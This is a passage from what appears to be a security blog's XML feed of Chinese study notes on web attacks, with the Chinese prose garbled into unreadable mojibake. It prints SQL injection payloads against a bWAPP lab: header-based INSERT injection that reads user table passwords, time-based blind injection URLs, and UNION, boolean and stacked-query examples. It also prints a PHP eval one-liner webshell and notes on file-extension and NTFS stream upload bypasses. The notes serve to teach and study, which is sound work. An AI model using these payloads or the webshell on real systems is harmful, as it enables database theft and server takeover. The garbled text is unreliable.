alt="fileupload"><br>é€šè¿‡é¡µé¢åˆ¤æ–­ï¼Œipå’ŒUAçš„å€¼éƒ½æ˜¯ç”±ç”¨æˆ·è¾“å…¥åç«¯æœåŠ¡çš„ï¼ŒçŒœæµ‹ä½¿ç”¨insert â€¦ value â€¦ è¯­å¥ï¼Œæ„é€ è¯­å¥ï¼ŒåŒæ—¶åˆ©ç”¨ # é—­åˆsqlè¯­å¥æ’é™¤å¹²æ‰°ï¼Œè§‚å¯Ÿé¡µé¢ï¼Œipå’ŒUAè¢«æˆåŠŸä¿®æ”¹ï¼š<br><img src="/img/sql/httpheader/httpheader4.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/sql/httpheader/httpheader5.png" srcset="/img/loading.gif" alt="fileupload"><br>ç®€å•æ„é€ æ³¨å…¥è¯­å¥ï¼ŒæŸ¥è¯¢æ•°æ®åº“åç§°ï¼š<br><img src="/img/sql/httpheader/httpheader7.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/sql/httpheader/httpheader8.png" srcset="/img/loading.gif" alt="fileupload"></p><h3 id="è·å–ç”¨æˆ·è¡¨å"><a href="#è·å–ç”¨æˆ·è¡¨å" class="headerlink" title="è·å–ç”¨æˆ·è¡¨å"></a>è·å–ç”¨æˆ·è¡¨å</h3><p>æ„é€ è¯­å¥è·å–æ•°æ®åº“è¡¨ï¼š<br><img src="/img/sql/httpheader/httpheader9.png" srcset="/img/loading.gif" alt="fileupload"><br>å‘ç°æ¯æ¬¡è¿”å›æ•°æ®è¡Œæ•°é™åˆ¶ä¸º1è¡Œï¼Œä¿®æ”¹è¯­å¥å†æ¬¡æ‰§è¡Œï¼Œè¿”å›çš„è¡¨åä¸ºblogä¸æ˜¯ç”¨æˆ·è¡¨ï¼š<br><img src="/img/sql/httpheader/httpheader10.png" srcset="/img/loading.gif" alt="fileupload"><br>é€šè¿‡offsetæ§åˆ¶è¿”å›ç¬¬å‡ æ¡ï¼Œå½“offset=3æ—¶ï¼Œè¿”å›ç”¨æˆ·è¡¨usersï¼š<br><img src="/img/sql/httpheader/httpheader11.png" srcset="/img/loading.gif" alt="fileupload"></p><pre><code class="hljs plain">123&#39;,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 1 offset 3)); #</code></pre><h3 id="è·å–ç”¨æˆ·è¡¨ä¿¡æ¯"><a href="#è·å–ç”¨æˆ·è¡¨ä¿¡æ¯" class="headerlink" title="è·å–ç”¨æˆ·è¡¨ä¿¡æ¯"></a>è·å–ç”¨æˆ·è¡¨ä¿¡æ¯</h3><p>è¿‡ç¨‹å’Œä¸Šè¿°ç±»ä¼¼ï¼Œåˆ©ç”¨ä»¥ä¸‹æŒ‡ä»¤å³å¯æŸ¥å¾—id,ç»§ç»­åˆ©ç”¨åç§»æŸ¥è¯¢ id login password åˆ†åˆ«ä½äºåç§» 0, 1, 2 å¤„</p><pre><code class="hljs plain">111&#39;, (select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1 offset 0)); #</code></pre><p><img src="/img/sql/httpheader/httpheader12.png" srcset="/img/loading.gif" alt="fileupload"></p><h3 id="è·å–ç”¨æˆ·åå¯†ç "><a href="#è·å–ç”¨æˆ·åå¯†ç " class="headerlink" title="è·å–ç”¨æˆ·åå¯†ç "></a>è·å–ç”¨æˆ·åå¯†ç </h3><pre><code class="hljs plain">111&#39;, (select login from users limit 1 offset 2)); #</code></pre><p>å°†loginæ›¿æ¢ä¸ºidã€password åŒæ—¶ä¿®æ”¹offsetå€¼ï¼Œå³å¯è·å¾—ç›¸åº”ç”¨æˆ·çš„å¯†ç ä¿¡æ¯ã€‚<br><img src="/img/sql/httpheader/httpheader13.png" srcset="/img/loading.gif" alt="fileupload"></p><h2 id="æ¼æ´è¿›é˜¶"><a href="#æ¼æ´è¿›é˜¶" class="headerlink" title="æ¼æ´è¿›é˜¶"></a>æ¼æ´è¿›é˜¶</h2><h3 id="ä¿®æ”¹é¶åœºä»£ç é€»è¾‘"><a href="#ä¿®æ”¹é¶åœºä»£ç é€»è¾‘" class="headerlink" title="ä¿®æ”¹é¶åœºä»£ç é€»è¾‘"></a>ä¿®æ”¹é¶åœºä»£ç é€»è¾‘</h3><pre><code class="hljs plain">&#x2F;&#x2F; Writes the entry into the database$sql &#x3D; &quot;INSERT INTO visitors (date, user_agent, ip_address) VALUES (now(), &#39;&quot; . sqli($user_agent) . &quot;&#39;, &#39;&quot; . $ip_address . &quot;&#39;)&quot;;</code></pre><p>åŸå§‹çš„é€»è¾‘ï¼Œipæ˜¯æ”¾åœ¨uaä¹‹åæ˜¾ç¤ºçš„ï¼Œç°åœ¨ä¿®æ”¹ä»£ç é€»è¾‘ï¼Œå°†ipä¸uaæ›¿æ¢ä½ç½®ï¼š</p><pre><code class="hljs plain">$sql &#x3D; &quot;INSERT INTO visitors (date, ip_address, user_agent) VALUES (now(), &#39;&quot; . sqli($ip_address) . &quot;&#39;, &#39;&quot; . $user_agent . &quot;&#39;)&quot;;</code></pre><p>è¿™æ ·å¤„ç†åï¼ŒæœåŠ¡ç«¯å°±ä¸ä¼šè¿”å›æˆ‘ä»¬æ„é€ çš„ä¸Šè¿°SQLæ³¨å…¥è¯­å¥çš„æ‰§è¡Œç»“æœäº†ã€‚<br>æ­¤æ—¶å¯é‡‡ç”¨åŸºäºæ—¶é—´ç›²æ³¨çš„æ–¹å¼ï¼Œé€šè¿‡é¡µé¢çš„å“åº”æ—¶é—´ï¼Œåˆ¤æ–­SQLè¯­å¥æ˜¯å¦æˆåŠŸæ‰§è¡Œï¼Œå†é€šè¿‡è„šæœ¬è‡ªåŠ¨æµ‹è¯•å®Œæˆä¿¡æ¯è·å–ï¼š</p><pre><code class="hljs plain">123&#39;+ (select 1 from (select user()) as t where length((select database())) &#x3D; 5 and sleep(2))); #</code></pre>]]></content>
    
    
    <categories>
      
      <category>Webå®‰å…¨</category>
      
      <category>SQLæ³¨å…¥</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨</tag>
      
      <tag>Webå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€ŠWebæ”»é˜²å®‰å…¨å®æˆ˜ã€‹å­¦ä¹ æ€»ç»“ï¼šSQLæ³¨å…¥å®æˆ˜â€”â€”åˆ©ç”¨æ—¶é—´ç›²æ³¨ç»•è¿‡æ— æŠ¥é”™æ— å›æ˜¾åœºæ™¯</title>
    <link href="/2021/01/08/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"/>
    <url>/2021/01/08/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h1><h2 id="æ—¶é—´ç›²æ³¨å¸¸ç”¨å‡½æ•°"><a href="#æ—¶é—´ç›²æ³¨å¸¸ç”¨å‡½æ•°" class="headerlink" title="æ—¶é—´ç›²æ³¨å¸¸ç”¨å‡½æ•°"></a>æ—¶é—´ç›²æ³¨å¸¸ç”¨å‡½æ•°</h2><pre><code class="hljs plain">substrï¼ˆa,b,cï¼‰ï¼šä»bä½ç½®å¼€å§‹ï¼Œæˆªå–å­—ç¬¦ä¸²açš„cé•¿åº¦countï¼ˆï¼‰ï¼šè®¡ç®—æ€»æ•°asciiï¼ˆï¼‰ï¼šè¿”å›å­—ç¬¦çš„ASCIIç lengthï¼ˆï¼‰ï¼šè¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦leftï¼ˆa,bï¼‰ï¼šä»å·¦åˆ°å³æˆªå–å­—ç¬¦ä¸²açš„å‰bä¸ªå­—ç¬¦sleepï¼ˆnï¼‰ï¼šå°†ç¨‹åºæŒ‚èµ·nç§’</code></pre><h2 id="æ—¶é—´ç›²æ³¨å®æˆ˜"><a href="#æ—¶é—´ç›²æ³¨å®æˆ˜" class="headerlink" title="æ—¶é—´ç›²æ³¨å®æˆ˜"></a>æ—¶é—´ç›²æ³¨å®æˆ˜</h2><p>World War Zç”µå½±å­˜åœ¨</p><pre><code class="hljs plain"># åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ—¶é—´ç›²æ³¨http:&#x2F;&#x2F;bwapp.com:8888&#x2F;sqli_15.php?title&#x3D;World War Z&#39; and sleep(2)-- &amp;action&#x3D;search# åˆ¤æ–­æ•°æ®åº“åé•¿åº¦http:&#x2F;&#x2F;bwapp.com:8888&#x2F;sqli_15.php?title&#x3D;World War Z&#39; and length(database()) &gt; 5 and sleep(2)-- &amp;action&#x3D;search# åˆ©ç”¨substrå‡½æ•°éå†æ•°æ®åº“åç§°å­—ç¬¦ï¼Œæ¯”å¦‚ä¸‹é¢é€šè¿‡æ—¶é—´ç›²æ³¨åˆ¤æ–­æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ä¸æ˜¯bhttp:&#x2F;&#x2F;bwapp.com:8888&#x2F;sqli_15.php?title&#x3D;World War Z&#39; and substr(database(),1,1) &#x3D; &#39;b&#39; and sleep(2)-- &amp;action&#x3D;search# è‡ªåŠ¨åŒ–æ£€æµ‹# é€šè¿‡ç¨‹åºæ¯”è¾ƒï¼Œæ•°å­—çš„è¿ç®—ä¼šæ›´åŠ å¿«é€Ÿæ–¹ä¾¿ï¼Œå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºasciiç è¿›è¡Œå¯¹æ¯”http:&#x2F;&#x2F;bwapp.com:8888&#x2F;sqli_15.php?title&#x3D;World War Z&#39; and ascii(substr(database(),1,1))&#x3D;1 and sl eep(2)-- aaction&#x3D;searchhttp:&#x2F;&#x2F;bwapp.com:8888&#x2F;sqli_15.php?title&#x3D;World War Z&#39; and ascii(substr(database(),1,1))&#x3D;98 and sleep(2)-- aaction&#x3D;search# è‡ªåŠ¨åŒ–éå†æ•°æ®åº“åã€å†…å®¹è„šæœ¬</code></pre><p><img src="/img/sql/timebase/timebase1.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/sql/timebase/timebase2.png" srcset="/img/loading.gif" alt="fileupload"></p>]]></content>
    
    
    <categories>
      
      <category>Webå®‰å…¨</category>
      
      <category>SQLæ³¨å…¥</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨</tag>
      
      <tag>Webå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€ŠWebæ”»é˜²å®‰å…¨å®æˆ˜ã€‹å­¦ä¹ æ€»ç»“ï¼šSQLæ³¨å…¥åŸç†</title>
    <link href="/2020/12/27/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/"/>
    <url>/2020/12/27/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h1><h2 id="1ã€MySQLå…¥é—¨"><a href="#1ã€MySQLå…¥é—¨" class="headerlink" title="1ã€MySQLå…¥é—¨"></a>1ã€MySQLå…¥é—¨</h2><h3 id="information-schemaåº“"><a href="#information-schemaåº“" class="headerlink" title="information_schemaåº“"></a>information_schemaåº“</h3><p>ä¿¡æ¯æ•°æ®åº“ã€‚ä¿å­˜ç€å…³äºMySQLæœåŠ¡å™¨æ‰€ç»´æŠ¤çš„æ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ã€‚å¦‚æ•°æ®åº“åï¼Œæ•°æ®åº“çš„è¡¨ï¼Œè¡¨æ çš„æ•°æ®ç±»å‹ä¸è®¿é—®æƒé™ç­‰ã€‚</p><h4 id="schemataè¡¨"><a href="#schemataè¡¨" class="headerlink" title="schemataè¡¨"></a>schemataè¡¨</h4><p>æä¾›äº†å½“å‰MySQLå®ä¾‹ä¸­æ‰€æœ‰æ•°æ®åº“çš„ä¿¡æ¯ã€‚show databasesçš„ç»“æœå°±æ˜¯å–ä¹‹æ­¤è¡¨ã€‚</p><pre><code class="hljs plain">select * from information_schema.schemata;</code></pre><h4 id="tablesè¡¨"><a href="#tablesè¡¨" class="headerlink" title="tablesè¡¨"></a>tablesè¡¨</h4><p>æä¾›äº†å…³äºæ•°æ®åº“ä¸­çš„è¡¨çš„ä¿¡æ¯åŒ…æ‹¬è§†å›¾ã€‚</p><pre><code class="hljs plain">select * from information_schema.tables where table_schema&#x3D;&#39;table_name&#39;;</code></pre><h4 id="columnsè¡¨ï¼š"><a href="#columnsè¡¨ï¼š" class="headerlink" title="columnsè¡¨ï¼š"></a>columnsè¡¨ï¼š</h4><p>æä¾›äº†è¡¨ä¸­çš„åˆ—ä¿¡æ¯ã€‚è¯¦ç»†æè¿°äº†æŸå¼ è¡¨çš„æ‰€æœ‰åˆ—çš„ä¿¡æ¯ã€‚</p><pre><code class="hljs plain">select * from information_schema.columns where table_schema&#x3D;&#39;table_name&#39;;</code></pre><h3 id="mysqlåº“"><a href="#mysqlåº“" class="headerlink" title="mysqlåº“"></a>mysqlåº“</h3><p>MySQLæ ¸å¿ƒæ•°æ®åº“ï¼Œä¸»è¦è´Ÿè´£å­˜å‚¨æ•°æ®åº“çš„ç”¨æˆ·ã€æƒé™è®¾ç½®ã€å…³é”®å­—ç­‰mysqlè‡ªå·±éœ€è¦ä½¿ç”¨çš„æ§åˆ¶å’Œç®¡ç†ä¿¡æ¯ã€‚</p><h3 id="performance-schemaåº“"><a href="#performance-schemaåº“" class="headerlink" title="performance_schemaåº“"></a>performance_schemaåº“</h3><p>å†…å­˜æ•°æ®åº“ï¼Œæ•°æ®æ”¾åœ¨å†…å­˜ä¸­ç›´æ¥æ“ä½œçš„æ•°æ®åº“ã€‚ä¸»è¦ç”¨äºæé«˜åº”ç”¨è¯»å†™æ€§èƒ½ã€‚</p><h3 id="sysåº“"><a href="#sysåº“" class="headerlink" title="sysåº“"></a>sysåº“</h3><p>åŸºäºIPæˆ–ç”¨æˆ·æŸ¥è¯¢èµ„æºä½¿ç”¨æƒ…å†µã€‚ä»¥åŠè¡¨çš„è®¿é—®ä¿¡æ¯ç­‰ã€‚</p><h2 id="SQlæ³¨å…¥åŸç†"><a href="#SQlæ³¨å…¥åŸç†" class="headerlink" title="SQlæ³¨å…¥åŸç†"></a>SQlæ³¨å…¥åŸç†</h2><p>SQLæ³¨å…¥æ˜¯å‘ç”Ÿäºåº”ç”¨ç¨‹åºä¸æ•°æ®åº“å±‚çš„å®‰å…¨æ¼æ´ã€‚å¦‚ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¢«æ„é€ æˆæ¶æ„çš„SQLä»£ç ï¼ŒWebåº”ç”¨åˆæœªå¯¹åŠ¨æ€æ„é€ çš„SQLè¯­å¥ä½¿ç”¨çš„å‚æ•°è¿›è¡Œå®¡æŸ¥ï¼Œåˆ™ä¼šå¼•å‘SQLæ³¨å…¥ã€‚</p><h3 id="GETå‹SQLæ³¨å…¥æ¼æ´"><a href="#GETå‹SQLæ³¨å…¥æ¼æ´" class="headerlink" title="GETå‹SQLæ³¨å…¥æ¼æ´"></a>GETå‹SQLæ³¨å…¥æ¼æ´</h3><p>GETæ–¹æ³•æäº¤çš„å†…å®¹ä¼šæ˜¾ç¤ºåœ¨ç½‘é¡µURLä¸Šï¼Œé€šè¿‡å¯¹URLè¿æ¥è¿›è¡Œæ„é€ ï¼Œè·å¾—è¶…å‡ºæƒé™ä¿¡æ¯çš„å†…å®¹ã€‚<br>æµ‹è¯•å­—æ®µæ•°é‡åŠå›æ˜¾çš„å­—æ®µä½ç½®ï¼Œæ›¿æ¢é€‰é¡¹ï¼Œè·å–â€œä½¿ç”¨çš„æ•°æ®åº“ç”¨æˆ·â€ã€â€œä½¿ç”¨çš„æ•°æ®åº“åç§°â€ã€â€œå½“å‰æ•°æ®åº“ç‰ˆæœ¬â€ã€â€œå½“å‰ä½¿ç”¨çš„æ•°æ®åº“è¡¨â€</p><pre><code class="hljs plain">&#39;union select 1,user(),table_name,database(),version(),6,7 from information_schema.tables where table_schema&#x3D;database(); --+</code></pre><h3 id="POSTå‹SQLæ³¨å…¥æ¼æ´"><a href="#POSTå‹SQLæ³¨å…¥æ¼æ´" class="headerlink" title="POSTå‹SQLæ³¨å…¥æ¼æ´"></a>POSTå‹SQLæ³¨å…¥æ¼æ´</h3><p>æ³¨å…¥ä¿¡æ¯å­˜å‚¨äºHTTPå®ä½“å†…å®¹è€Œä¸æ˜¯URLï¼Œé€šè¿‡æ”¹é€ å®ä½“å†…å®¹ï¼Œè¾¾åˆ°å®é™…æ‰§è¡Œçš„SQLè¯­å¥è·å–æ›´å¤šä¿¡æ¯çš„ç›®çš„ã€‚</p><h2 id="5ç§ä¸åŒçš„æ³¨å…¥ç±»å‹"><a href="#5ç§ä¸åŒçš„æ³¨å…¥ç±»å‹" class="headerlink" title="5ç§ä¸åŒçš„æ³¨å…¥ç±»å‹"></a>5ç§ä¸åŒçš„æ³¨å…¥ç±»å‹</h2><h3 id="Boolean-based-blind-SQL-injectionï¼ˆå¸ƒå°”å‹æ³¨å…¥ï¼‰"><a href="#Boolean-based-blind-SQL-injectionï¼ˆå¸ƒå°”å‹æ³¨å…¥ï¼‰" class="headerlink" title="Boolean-based blind SQL injectionï¼ˆå¸ƒå°”å‹æ³¨å…¥ï¼‰"></a>Boolean-based blind SQL injectionï¼ˆå¸ƒå°”å‹æ³¨å…¥ï¼‰</h3><pre><code class="hljs plain">?id&#x3D;1 and substring(version(),1,1)&#x3D;5</code></pre><p>å¦‚æœæœåŠ¡ç«¯MySQLç‰ˆæœ¬æ˜¯5.Xï¼Œé‚£è¿”å›çš„å†…å®¹å°±å’Œæ­£å¸¸è¯·æ±‚ä¸€æ ·ã€‚</p><h3 id="UNION-query-SQL-injectionï¼ˆå¯è”åˆæŸ¥è¯¢æ³¨å…¥ï¼‰"><a href="#UNION-query-SQL-injectionï¼ˆå¯è”åˆæŸ¥è¯¢æ³¨å…¥ï¼‰" class="headerlink" title="UNION query SQL injectionï¼ˆå¯è”åˆæŸ¥è¯¢æ³¨å…¥ï¼‰"></a>UNION query SQL injectionï¼ˆå¯è”åˆæŸ¥è¯¢æ³¨å…¥ï¼‰</h3><pre><code class="hljs plain">?id&#x3D;1 union all select schema_name from information_schema.schemata</code></pre><p>æœ€å¿«æ·çš„æ–¹æ³•ï¼Œé€šè¿‡unionæŸ¥è¯¢è·å–æ‰€æœ‰æƒ³è¦çš„æ•°æ®ï¼Œå‰ææ˜¯è¿”å›ä¸­ä¼šæºå¸¦SQLæ‰§è¡ŒåæŸ¥è¯¢åˆ°çš„å†…å®¹ï¼Œåˆ©ç”¨éš¾åº¦è¾ƒå¤§</p><h3 id="Time-based-blind-SQL-injectionï¼ˆåŸºäºæ—¶é—´å»¶è¿Ÿæ³¨å…¥ï¼‰"><a href="#Time-based-blind-SQL-injectionï¼ˆåŸºäºæ—¶é—´å»¶è¿Ÿæ³¨å…¥ï¼‰" class="headerlink" title="Time-based blind SQL injectionï¼ˆåŸºäºæ—¶é—´å»¶è¿Ÿæ³¨å…¥ï¼‰"></a>Time-based blind SQL injectionï¼ˆåŸºäºæ—¶é—´å»¶è¿Ÿæ³¨å…¥ï¼‰</h3><pre><code class="hljs plain">select * from user where id&#x3D;&#39;4&#39; and sleep(3);</code></pre><p>é€šè¿‡åˆ¤æ–­è¯·æ±‚çš„å“åº”æ—¶é—´ï¼Œåˆ¤æ–­SQLæ˜¯å¦æˆåŠŸæ‰§è¡Œï¼Œå¸¸ç”¨äºé¡µé¢æ— å›æ˜¾çš„åœºæ™¯</p><h3 id="Error-based-SQL-injectionï¼ˆæŠ¥é”™å‹æ³¨å…¥ï¼‰"><a href="#Error-based-SQL-injectionï¼ˆæŠ¥é”™å‹æ³¨å…¥ï¼‰" class="headerlink" title="Error-based SQL injectionï¼ˆæŠ¥é”™å‹æ³¨å…¥ï¼‰"></a>Error-based SQL injectionï¼ˆæŠ¥é”™å‹æ³¨å…¥ï¼‰</h3><p>å¦‚æœåç«¯èƒ½è¿”å›SQLæŠ¥é”™ä¿¡æ¯ï¼Œåˆ™è€ƒè™‘ä½¿ç”¨æŠ¥é”™å‹æ³¨å…¥ï¼Œå¦‚åˆ©ç”¨group byçš„duplicate entryé”™è¯¯ã€‚</p><h3 id="Stacked-querier-SQL-injectionï¼ˆå¯å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥ï¼‰"><a href="#Stacked-querier-SQL-injectionï¼ˆå¯å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥ï¼‰" class="headerlink" title="Stacked querier SQL injectionï¼ˆå¯å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥ï¼‰"></a>Stacked querier SQL injectionï¼ˆå¯å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥ï¼‰</h3><pre><code class="hljs plain">?id&#x3D;1;update t set name &#x3D;&#39;a&#39; where id &#x3D;1</code></pre><p>èƒ½æ‰§è¡Œå¤šæ¡æŸ¥è¯¢è¯­å¥ï¼Œéå¸¸å±é™©ï¼Œæ„å‘³ç€å¯ç›´æ¥æ›´æ–°æ•°æ®åº“ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Webå®‰å…¨</category>
      
      <category>SQLæ³¨å…¥</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨</tag>
      
      <tag>Webå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€ŠWebæ”»é˜²å®‰å…¨å®æˆ˜ã€‹å­¦ä¹ æ€»ç»“ï¼šæ–‡ä»¶ä¸Šä¼ æ¼æ´</title>
    <link href="/2020/12/05/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <url>/2020/12/05/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´</h1><h2 id="1ã€æ¼æ´åŸç†ï¼šWebshell"><a href="#1ã€æ¼æ´åŸç†ï¼šWebshell" class="headerlink" title="1ã€æ¼æ´åŸç†ï¼šWebshell"></a>1ã€æ¼æ´åŸç†ï¼šWebshell</h2><p>webshellï¼Œé¡¾åæ€ä¹‰ï¼šwebæŒ‡çš„æ˜¯åœ¨webæœåŠ¡å™¨ä¸Šï¼Œè€Œshellæ˜¯ç”¨è„šæœ¬è¯­è¨€ç¼–å†™çš„è„šæœ¬ç¨‹åºï¼Œwebshellå°±æ˜¯å°±æ˜¯webçš„ä¸€ä¸ªç®¡ç†å·¥å…·ï¼Œå¯ä»¥å¯¹webæœåŠ¡å™¨è¿›è¡Œæ“ä½œçš„æƒé™ã€‚<br>webshellæ ¹æ®è„šæœ¬å¯ä»¥åˆ†ä¸ºPHPè„šæœ¬æœ¨é©¬ï¼ŒASPè„šæœ¬æœ¨é©¬ï¼Œä¹Ÿæœ‰åŸºäº.NETçš„è„šæœ¬æœ¨é©¬å’ŒJSPè„šæœ¬æœ¨é©¬ã€‚<br>å…³é”®å‡½æ•°ï¼šä»¥phpä¸ºä¾‹ï¼Œevalï¼ˆï¼‰ï¼Œæ‰§è¡Œç”¨æˆ·è¾“å…¥çš„å‡½æ•°ã€‚</p><h2 id="2ã€ä¸€å¥è¯æœ¨é©¬"><a href="#2ã€ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="2ã€ä¸€å¥è¯æœ¨é©¬"></a>2ã€ä¸€å¥è¯æœ¨é©¬</h2><h3 id="2-1-phpä¸€å¥è¯æœ¨é©¬"><a href="#2-1-phpä¸€å¥è¯æœ¨é©¬" class="headerlink" title="2.1 phpä¸€å¥è¯æœ¨é©¬"></a>2.1 phpä¸€å¥è¯æœ¨é©¬</h3><pre><code class="hljs plain">&lt;?php @eval($_POST[&#39;hacker&#39;]);?&gt;</code></pre><p>è·å–postè¯·æ±‚ä¸­hackerå­—æ®µçš„å€¼ï¼Œå¹¶å°†è¯¥å€¼è½¬æ¢ä¸ºphpä»£ç æ‰§è¡Œï¼›</p><h2 id="3ã€åç¼€åç»•è¿‡"><a href="#3ã€åç¼€åç»•è¿‡" class="headerlink" title="3ã€åç¼€åç»•è¿‡"></a>3ã€åç¼€åç»•è¿‡</h2><h3 id="3-1-phpæ–‡ä»¶åç¼€åç»•è¿‡"><a href="#3-1-phpæ–‡ä»¶åç¼€åç»•è¿‡" class="headerlink" title="3.1 phpæ–‡ä»¶åç¼€åç»•è¿‡"></a>3.1 phpæ–‡ä»¶åç¼€åç»•è¿‡</h3><p>apacheã€nginxç­‰webæœåŠ¡å™¨ä¼šåŠ è½½ä¸€äº›è¯­è¨€è§£æå™¨æ¨¡å—ï¼Œå¦‚pythonã€phpã€aspç­‰ï¼Œå½“æŸä¸ªç‰¹å®šçš„æ–‡ä»¶åç¼€åè¢«é™åˆ¶ä¸Šä¼ çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ ¹æ®web serverçš„è§£æåŸç†ï¼Œä¿®æ”¹æ–‡ä»¶åç¼€åï¼Œè¾¾åˆ°ç»•è¿‡é™åˆ¶çš„ç›®çš„ï¼Œä½†ä¸æ˜¯æ‰€æœ‰çš„åç¼€åéƒ½èƒ½è¢«web serverè§£æï¼Œä¸‹é¢é€šè¿‡å®æˆ˜æ¨¡æ‹Ÿæ¢ç©¶ä¸‹ç»•è¿‡çš„åŸç†</p><h2 id="4ã€Windowsæ–‡ä»¶æµç‰¹æ€§ç»•è¿‡"><a href="#4ã€Windowsæ–‡ä»¶æµç‰¹æ€§ç»•è¿‡" class="headerlink" title="4ã€Windowsæ–‡ä»¶æµç‰¹æ€§ç»•è¿‡"></a>4ã€Windowsæ–‡ä»¶æµç‰¹æ€§ç»•è¿‡</h2><p>Windowså¹³å°ä½¿ç”¨NTFSæ–‡ä»¶æµï¼ŒNTFSç¯å¢ƒä¸€ä¸ªæ–‡ä»¶é»˜è®¤ä½¿ç”¨çš„æ˜¯æœªå‘½åæ–‡ä»¶æµï¼ŒåŒæ—¶å¯åˆ›å»ºå…¶ä»–å‘½ä»¤çš„æ–‡ä»¶æµï¼ŒWindowsèµ„æºç®¡ç†å™¨é»˜è®¤ä¸æ˜¾ç¤ºå‡ºæ–‡ä»¶çš„å‘½åæ–‡ä»¶æµã€‚ä¸¾ä¾‹ï¼š<br>1ï¼‰åœ¨ä»»ä¸€NTFSåˆ†åŒºä¸‹æ‰“å¼€CMDå‘½ä»¤æç¤ºç¬¦ï¼Œè¾“å…¥echo abcde&gt;&gt;a.txt:b.txtï¼Œåˆ™åœ¨å½“å‰ç›®å½•ä¸‹ä¼šç”Ÿæˆä¸€ä¸ªåä¸ºa.txtçš„æ–‡ä»¶ï¼Œä½†æ–‡ä»¶çš„å¤§å°ä¸º0å­—èŠ‚ï¼Œæ‰“å¼€åä¹Ÿæ— ä»»ä½•å†…å®¹ï¼Œåªæœ‰è¾“å…¥å‘½ä»¤ï¼šnotepad a.txt:b.txt æ‰èƒ½çœ‹è§å†™å…¥çš„abcde<br>2ï¼‰åœ¨ä¸Šè¾¹çš„å‘½ä»¤ä¸­ï¼Œa.txtå¯ä»¥ä¸å­˜åœ¨ï¼Œä¹Ÿå¯ä»¥æ˜¯æŸä¸ªå·²å­˜çš„æ–‡ä»¶ï¼Œæ–‡ä»¶æ ¼å¼æ— æ‰€è°“ï¼Œæ— 